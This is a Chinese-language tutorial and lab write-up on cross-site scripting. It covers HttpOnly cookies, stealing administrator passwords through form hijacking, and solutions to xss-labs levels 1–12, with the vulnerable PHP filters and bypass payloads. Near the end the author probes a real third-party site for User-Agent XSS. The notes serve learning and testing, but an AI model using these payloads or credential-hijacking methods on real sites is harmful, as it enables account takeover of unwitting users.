![](https://gitee.com/YatJay/image/raw/master/img/202203041520473.png)

# 涉及知识

## HTTPOnly

### 什么是HttpOnly

如果您在cookie中设置了HttpOnly属性，那么**通过js脚本将无法读取到cookie信息**，这样能有效的防止XSS攻击

注意HttpOnly只是阻止js脚本传递Cookie信息，并不能防止XSS漏洞

### PHP设置COOKIE的HttpOnly属性

httponly是微软对cookie做的扩展。这个主要是解决用户的cookie可能被盗用的问题。

PHP中的设置 

PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在`php.ini`中

`session.cookie_httponly = 1`

设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启： 


```php
<?php
  ini_set("session.cookie_httponly", 1); 
 // or
  session_set_cookie_params(0, NULL, NULL, NULL, TRUE); 
?> 
```

Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： 
```php
 setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE); 
 setrawcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);
```
 对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了： 
```php
 <?php
  header("Set-Cookie: hidden=value; httpOnly");
  ?> 
```

### HttpOnly的绕过

若对方服务器开启HttpOnly，则无法通过XSS获取Cookie，我们的目的是进入网站后台，进入后台有两种登录方式

1. 使用Cookie登录
2. 使用账号+密码登录

因此只能设法获取账号+密码进入后台，而有些管理员习惯将账号密码信息保存在浏览器端，若对方管理员有账号密码保存在浏览器的习惯，那么可以通过XSS漏洞读取浏览器中存储的账号密码信息。分一下两种情况：

1. 保存读取：对方浏览器已经记录账号密码信息——直接读取
2. 没有保存读取：对方浏览器没有保存账号密码信息——表单劫持

#### 表单劫持

XSS在线平台一般都会提供表单劫持功能模块

![](https://gitee.com/YatJay/image/raw/master/img/202203041906554.png)

##### XSS表单劫持原理

对于一个登录页面，当使用者输入账号密码之后，一般通过HTML的表单提交数据，再由POST方式将接收的数据参数提交到后台

比如下面是一个典型的登录页面的前端部分代码，注意`form`标签下的表单

```html
<form name="form1" action="admin/admin_cl.php" method="post" id="form1">
<fieldset>
 <legend><span class="style1">军锋基地欢迎您的到来</span>！</legend>
  <br/> <div>现在时间：2022-03-04 19:10:07<br/>  
</div><br/> 
 <div>
   <label >管理员用户名：</label>
   <input type="text" class="text_m" name="admin_name"  \>
   <br/>
</div>
 <div>
   <label >管理员密码：</label>
   <input type="password" class="text_m" name="admin_password"  \>
   <br/>   
</div>
  <div>
   <label for="yanzheng">验证码</label>
<input type="text" class="text_s" name="yanzheng" \> <img src="lib/yanzheng.php" alt="看不清楚?请点击刷新" onclick="this.src=this.src+'?'+Math.random();" style="CURSOR:hand;">  *<br/>  
</div>
   <div class="enter">
   <input name="Submit"  type="submit" class="buttom" value="提交" />
   <input name="Submit" type="reset" class="buttom" value="重置" />
</div>
</fieldset>
</form>
```

输入账号密码后点击登录，此时抓包，就能看到前端向后端提交的数据包当中会携带刚才提交的账号密码信息

![](https://gitee.com/YatJay/image/raw/master/img/202203041932730.png)

如果能够在登录时触发XSS的表单劫持脚本代码，就会将账号密码信息发送回XSS后台，我们就能以此拿到管理员的账号密码信息。

需要注意的是，如果要利用表单劫持，那么XSS漏洞必须出现在登录框所在页面，**也即XSS的表单劫持代码必须插入到登录框所在的页面(XSS代码提前写入此页面等待触发)**，若登录框所在页面不存在跨站漏洞，就无法得到账号密码信息。

#### 直接读取

XSS在线平台也提供，直接读取浏览器保存的密码的功能模块，如下

![](https://gitee.com/YatJay/image/raw/master/img/202203041940542.png)

如果管理员账号密码保存在浏览器，则登录时以及登录后触发了XSS语句(勾选获取浏览器记住的明文密码)，都会把账号密码信息发送到XSS后台。==具体操作后续==

## XSS漏洞的发现及绕过——XSS-labs

## XSS有触发条件，是一种被动攻击手段

不同于SQL注入、文件上传是提交之后就能主动进行攻击、getshell等操作，XSS漏洞往往是要先提交注入，然后等待管理员或其他人员访问来触发，因此XSS有时比较有用，有时比较鸡肋。

本地XSS平台搭建：https://www.cnblogs.com/Cl0ud/p/12176961.html

# 演示案例

## HttpOnly安全过滤测试

在jfdd网站源码的admin.php文件中添加HttpOnly属性设置，清空在线XSS平台记录，清空网站Cookie记录

![](https://gitee.com/YatJay/image/raw/master/img/202203041635861.png)

复制XSS脚本代码，粘贴在留言板处并提交

![](https://gitee.com/YatJay/image/raw/master/img/202203031754213.png)

登录网站管理后台，查看是否触发XSS脚本

![](https://gitee.com/YatJay/image/raw/master/img/202203041642474.png)

在XSS平台查看获取的信息，可见获取的Cookie值为空

![](https://gitee.com/YatJay/image/raw/master/img/202203041641070.png)



但是HttpOnly属性不影响XSS漏洞，XSS仍然可用，只是不能通过js脚本传Cookie值。比如开启HttpOnly后XSS弹窗仍可执行

![](https://gitee.com/YatJay/image/raw/master/img/202203041650018.png)

![](https://gitee.com/YatJay/image/raw/master/img/202203041651793.png)



## HttpOnly安全过滤绕过思路

军锋真人CS野战在线预订系统演示，事先开启页面的HttpOnly功能

### XSS表单劫持登录页面提交的账号密码

配置XSS平台的项目，勾选表单劫持

![](https://gitee.com/YatJay/image/raw/master/img/202203061353319.png)

由于表单劫持的XSS代码必须在登录页面触发，为便于测试，我们把payload直接插入到admin.php文件中即登录页面的后台文件

![](https://gitee.com/YatJay/image/raw/master/img/202203061354215.png)

进行登录后查看XSS后台收到的账号密码信息

==//////////==  

### XSS直接读取浏览器保存的账号密码

==//////////==  

==当前几个在线XSS平台尚且无法使用以上功能模块== 

## Xss-labs关卡代码过滤绕过测试

### Level-1

更改url中GET方式提交的name参数值，可见页面显示的欢迎用户后的值也会改变，因此我们在GET提交的name参数处添加XSS测试代码`<script>alert(1)</script>`，可以成功执行，说明此处存在XSS漏洞

![](https://gitee.com/YatJay/image/raw/master/img/202203042008832.png)

### Level-2

仍然按照上一关的做法，在GET提交的参数处插入XSS代码，无法成功执行

![](https://gitee.com/YatJay/image/raw/master/img/202203042009932.png)

这说明提交的XSS代码，在执行时并不会被解析为js脚本，应该是有代码过滤，查看前端源码发现我们插入的XSS代码，由于尖括号被转义，执行时不会作为js脚本来执行

![](https://gitee.com/YatJay/image/raw/master/img/202203042012029.png)

查看本关卡的后台代码

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
```

可见是通过PHP的htmlspecialchars($str)函数，把提交到后台的keyword参数进行了转义

htmlspecialchars()函数的功能是把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体

但是通过查看前端代码我们发现，除了`<h2 align=center>没有找到和&lt;script&gt;alert(1)&lt;/script&gt;相关的结果.</h2><center>`这句代码，将提交的js代码进行了转义，下面还有一句`<input name=keyword  value="<script>alert(1)</script>">`中的js代码并没有被转义

![](https://gitee.com/YatJay/image/raw/master/img/202203042019469.png)

我们设法使得`<input name=keyword  value="<script>alert(1)</script>">`中`<script>`标签前的双引号和`input`标签闭合，那么`<script>`标签就会被浏览器作为js脚本执行(后面的双引号和>闭合与否都可执行)，因此，我们提交的XSS语句变为

```
"><script>alert(1)</script>
```

以上的input标签开始的语句就变成了

```
<input name=keyword  value=""><script>alert(1)</script>">
```

则`<script>`标签自然会作为js语句执行

测试成功

![](https://gitee.com/YatJay/image/raw/master/img/202203051324823.png)

### Level-3

搜索框随意提交字符，查看网页源代码，发现提交的内容会出现在前端代码的以下

![](https://gitee.com/YatJay/image/raw/master/img/202203052022200.png)

同上一关一样，仍然以同样方式，先闭合引号和input标签，再执行XSS脚本内容，于是提交`"><script>alert(1)</script>`，结果如下：

![](https://gitee.com/YatJay/image/raw/master/img/202203052026604.png)

并没有成功XSS弹窗，查看后台代码，发现提交的XSS语句内容中的js标签的**尖括号**被转义

![](https://gitee.com/YatJay/image/raw/master/img/202203052028767.png)

当尖括号会被转义时，如果要提交执行js脚本语句，就要另辟蹊径。注意到搜索框处(input标签)是一个表单，表单可以添加一个属性，就是onclick事件属性

#### HTML onclick 事件属性

当点击按钮时执行一段 JavaScript：

```html
<button onclick="copyText()">Copy Text</button>
```

##### 定义和用法

onclick 属性由元素上的鼠标点击触发。

**注释：**onclick 属性不适用以下元素：<base>、<bdo>、<br>、<head>、<html>、<iframe>、<meta>、<param>、<script>、<style> 或 <title>。

##### 示例

```html
<input onclick="alert(1)"/>  //引号内是要执行的js语句
```

则在input标签运行时，一旦有鼠标点击触发操作，就会弹窗

#### 构造XSS语句

基于此，我们构造、闭合待执行的input标签内容为：

原始input标签

```html
<input name=keyword  value='111111'>	
```

目的input标签(注意value属性的前半个单引号和后半个单引号的闭合)

```html
<input name=keyword  value='11111' onclick='alert(1)'>	
```

我们提交的XSS语句就成为：

```html
11111' onclick='alert(1)
```

提交后不会直接弹窗，需要手动点击输入框处，才能成功弹窗

![](https://gitee.com/YatJay/image/raw/master/img/202203052059352.png)

### Level-4

#### 构造XSS语句

第4关和第3关类似，只是在闭合input标签里的引号时，第3关需要闭合的是前后单引号，第4关需要闭合的是前后双引号，因此XSS语句就变成了

```
11111" onclick="alert(1)
```

![](https://gitee.com/YatJay/image/raw/master/img/202203052118380.png)

### Level-5

通过查看后端PHP代码发现，本关卡会过滤提交参数中的`<script`和 `on`字符，将其分别替换为`<scr_ipt` 和`o_n`，因此原来的onclick属性不能使用，更不能直接提交`<script>`脚本标签

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

#### 超链接调用javascript代码

##### HTML 链接语法

链接的HTML 代码很简单。它类似这样：

```html
<a href="url">链接文本</a>
```

##### 超链接执行js脚本

方式一：让js函数返回false,在onclick中也返回false;

```html
<a href="http://www.itcast.cn" onclick="return showTime();">显示当前时间</a>
```
方式二：将href指定成一段脚本
```html
<a href="javascript:showTime();">点击显示时间</a>
```

因此使用HTML超链接的方式，使得前端代码出现一个能执行js脚本语句的超链接，点击链接后弹窗

#### 构造XSS语句

既要闭合input标签内部，又要使得链接标签写入前端写法如下

原始input标签

```html
<input name=keyword  value="3333 ">
```

闭合inoput并构造添加一个超链接标签(注意前后双引号闭合)

```html
<input name=keyword  value="3333"><a href="javascript:alert(1);">链接文本</a><"">
```

则需要提交到搜索框中的部分为

```html
3333"><a href="javascript:alert(1);">链接文本</a><"
```

提交后XSS执行成功：

![](https://gitee.com/YatJay/image/raw/master/img/202203052213310.png)

### Level-6

对照第5关，将上面的XSS语句提交到第6关的搜索框中，发现无法弹窗，查看页面源代码，发现超链接标签中的href被替换

![](https://gitee.com/YatJay/image/raw/master/img/202203060944669.png)

![](https://gitee.com/YatJay/image/raw/master/img/202203060945083.png)

查看后台PHP代码，可见`<script`、`on`、`src`、`href`关键字都会被过滤

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

#### 构造XSS语句

但是`str_replace()` 函数以其他字符替换字符串中的一些字符（区分大小写）。

由于区分大小写，这时我们尝试将提交XSS语句中涉及过滤关键字的部分大小写绕过(这里只是单纯过滤关键字，没有使用正则表达式匹配，如果使用了正则匹配，则无法大小写绕过过滤)，则XSS语句写成

```
3333"><a Href="javascript:alert(1);">链接文本</a><"
```

提交后执行成功

![](https://gitee.com/YatJay/image/raw/master/img/202203060949593.png)

### Level-7

查看第7关过滤代码，重点是将提交参数先全部转为小写字符，再将其中的关键字替换为空

```php
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

尝试提交第6关的XSS，无法触发，查看页面源代码

![](https://gitee.com/YatJay/image/raw/master/img/202203060954954.png)

![](https://gitee.com/YatJay/image/raw/master/img/202203060954392.png)

可见提交参数中，涉及过滤的关键字都被替换为空，而且大小写也无法绕过，因为后端对于提交参数进行了全部转小写字符

#### 构造XSS语句

但是我们看到过滤代码只进行一次过滤，而非递归或循环过滤，因此我们将涉及的过滤关键字再写一遍插入到原关键字中，使得过滤时触发关键字被替换为空，过滤后又拼组成关键字并带到前端。则XSS语句为

```
3333"><a hrhrefef="javascscriptript:alert(1);">链接文本</a><"
```

提交后执行成功

![](https://gitee.com/YatJay/image/raw/master/img/202203061003754.png)

### Level-8

查看后端代码

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
```

可见提交内容会在过滤之后会成为下面友情链接的链接内容，且过滤方式如下

- 提交参数都会转小写，则大小写无法绕过

- 涉及关键字过滤，而且并不是把关键字替换为空，则无法使用插入双写关键字过滤

由于提交参数在过滤之后会成为下面友情链接的链接内容，因此我们尝试直接提交`javascript:alert(1);`，查看前端拼接情况

![](https://gitee.com/YatJay/image/raw/master/img/202203061018660.png)

可见过滤关键字会被替换，以至于无法构成合法的超链接执行js脚本的语句

#### 构造XSS语句

基于以上的过滤手法，我们想到编码绕过思路

在超级加解密工具中选择编码方式为

![](https://gitee.com/YatJay/image/raw/master/img/202203061013324.png)

对提交内容进行编码后在提交，`javascript:alert(1);`的编码结果如下：

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#59;
```

提交后点击友情链接，成功触发XSS代码

![](https://gitee.com/YatJay/image/raw/master/img/202203061021933.png)

### Level-9

查看后端PHP代码

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

提交的参数会被拼接到名为友情链接的超链接当中去，但是除了检查上述关键字之外，还会判断提交参数中是否有`http://`，若没有则无法成功拼接

#### 构造XSS语句

绕过思路

- 编码绕过关键字过滤
- 添加`//http://`，满足提交参数包含`http://`，js语句执行时`//`后的语句注释掉，以避免影响js语句执行

则XSS代码如下，即在上一关的`javascript:alert(1);`编码之后添加`//http://`

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#59;//http://
```

提交后天机友情链接，成功触发XSS语句

![](https://gitee.com/YatJay/image/raw/master/img/202203061029500.png)

### Level-10

查看后端PHP代码

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

阅读代码可知，本关卡通过GET方式提交两个参数，分别名为`keyword`和`t_sort`

`keyword`参数会做`htmlspecialchars($str)`处理

`t_sort`参数中的尖括号会被过滤并替换为空，在过滤后会显示在前端的表单中，但是该表单的`type`属性是`hidden`即不会显示出来(若要显示需将`type`属性设置为`text`)

#### 构造XSS语句

由于尖括号会被过滤，因此提交参数不能出现标签语句。

本关卡并不涉及过滤关键字，但是需要对`type="hidden"`配置的`input`标签的属性作处理，而在HTML中当`input`标签中同时出现`type=“hidden”`和`type=“text”`两种属性时，会执行后者，即显示出来。

先提交两个普通GET参数查看页面源码代码`http://localhost/pentest/xsslabs/level10.php?keyword=2222&t_sort=888`

![](https://gitee.com/YatJay/image/raw/master/img/202203061058361.png)

两个参数会分别显示位置见上图

我们设法使得表单里的input标签出现onclick鼠标触发事件属性，并且由于需要鼠标点击，那么type属性也不能为hidden，当`input`标签中同时出现`type=“hidden”`和`type=“text”`两种属性时，会执行后者，因此可以添加`type=“text”`属性到`input`标签中去

原始input标签如下

```html
<input name="t_sort"  value="888" type="hidden">
```

目的input标签如下

```html
<input name="t_sort"  value="888" onclick="alert(1)" type="text" type="hidden">
```

则XSS语句如下(GET参数提交)

```html
?keyword=2222&t_sort=888" onclick="alert(1)" type="text
```

提交后点击输入框，成功触发XSS语句

![](https://gitee.com/YatJay/image/raw/master/img/202203061116726.png)

### Level-11

查看后端PHP代码

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

本关卡和第10关类似，只是GET方式提交两个参数，分别名为`keyword`和`t_sort`，这两个参数都会做`htmlspecialchars($str)`处理，无法下手

`$_SERVER['HTTP_REFERER'];`提交的这个参数才会输出到一个`type="hidden"`的input标签中，且参数值不能出现尖括号

#### $_SERVER['HTTP_REFERER'] 

$_SERVER['HTTP_REFERER']  链接到当前页面的前一页面的 URL 地址。

而HTTP头中的Referer属性表示该次请求的来源，一般用于做防盗链

#### 检测来源-同源策略

假设xiaodi8网站后台添加管理员的PHP文件的调用URL为

`www.xiaodi8.com/adduser.php?username='xd'&passwd=123456`，网站管理员为`admin`

攻击者在自己的博客首页某文件加入代码

```js
<script src="www.xiaodi8.com/adduser.php?username='xd'&passwd=123456"></script>
```

admin某一天看到攻击者的博客并打开访问，如果此刻admin浏览器是登录xiaodi8网站状态的情况下，就会——自动对xiaodi8网站添加一个管理员，新建管理员名称为`xd`，密码为`123456`。攻击者就能通过这个新建的管理员账号密码登录到xiaodi8网站的后台。

基于以上的操作，xiaodi8网站应该采用同源策略即检测跳转来源是否是xiaodi8的域名，检测执行`adduser.php`的域名是从哪个域名跳转过来的

- 攻击者博客地址跳转：Referer:攻击者域名
- xioadi8域名跳转：Referer:xioadi8域名

这个过程也是一类XSS攻击+CSRF跨站请求伪造。

#### 构造XSS语句

绕过思路和上一关一样，但是提交参数的位置不是GET方式，而是`$_SERVER['HTTP_REFERER'];`，因此抓包后修改数据包，在HTTP头部中的Referer属性中提交XSS语句payload
原始input标签如下

```html
<input name="t_ref"  value="" type="hidden">
```

目的input标签如下

```html
<input name="t_ref"  value="" onclick="alert(1)" type="text" type="hidden">
```

则XSS语句如下(数据包中HTTP头部属性Referer中提交)

```html
" onclick="alert(1)" type="text
```

抓包修改或添加Refer属性

![](https://gitee.com/YatJay/image/raw/master/img/202203061139372.png)

点击输入框，成功触发XSS语句

![](https://gitee.com/YatJay/image/raw/master/img/202203061140681.png)

### Level-12

查看后端PHP代码

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

类似上一关`$_SERVER['HTTP_REFERER'];`，是通过HTTP头的Referer属性提交XSS参数，本关卡是通过HTTP头的`User-Agent`属性来提交payload

正常提价GET参数`keyword`和`t_sort`后查看页面源代码，注意输出在表单里的`User-Agent`信息

![](https://gitee.com/YatJay/image/raw/master/img/202203061311183.png)

#### 构造XSS语句

设法修改数据包中的`User-Agent`信息，使之传递XSS语句即可

抓包后将上一关的payload添加到数据包的`User-Agent`处即

```
User-Agent: " onclick="alert(1)" type="text
```

![](https://gitee.com/YatJay/image/raw/master/img/202203061317972.png)

提交后点击输入框，成功触发XSS语句

![](https://gitee.com/YatJay/image/raw/master/img/202203061314613.png)

在`http://ip.tool.chinaz.com/`页面存在一个类似的XSS漏洞，也是读取数据包的User-Agent信息

![](https://gitee.com/YatJay/image/raw/master/img/202203061323312.png)

抓包后修改User-Agent为XSS代码后提交测试能否触发XSS

![](https://gitee.com/YatJay/image/raw/master/img/202203061325204.png)

# 涉及资源

https://github.com/do0dl3/xss-labs

超级加解密转换工具：https://www.cr173.com/soft/21692.html

什么是HttpOnly：https://www.oschina.net/question/100267_65116

本地XSS平台搭建：https://www.cnblogs.com/Cl0ud/p/12176961.html

见配套资料文档中文件：xss绕过技术_it168文库.pdf
